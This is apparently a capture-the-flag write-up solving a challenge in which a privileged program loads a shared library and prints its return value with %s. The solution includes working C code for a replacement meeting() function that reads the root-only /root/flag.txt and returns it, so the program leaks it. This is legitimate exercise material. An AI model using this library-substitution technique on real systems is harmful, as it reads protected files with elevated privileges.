main reads `/root/flag.txt` into a malloc'd buffer in r`etrieve_the_fabric()`, but only stores the pointer in `flag_fabric_storage_pointer` and never prints it. What it does print is `name_pointer`, the return value of meeting() from libmeeting.so, using %s. The shared object runs in the same process and with the same privileges, so meeting() can simply open the same file itself and return a pointer to a static buffer. main then prints the flag as the "name".

```c

static char flag[256];

void *meeting(void *arg) {
	(void)arg;
	FILE *f = fopen("/root/flag.txt", "r");

	if (f) {
		fgets(flag, sizeof(flag), f);
		fclose(f);
	}
	return flag;
}

```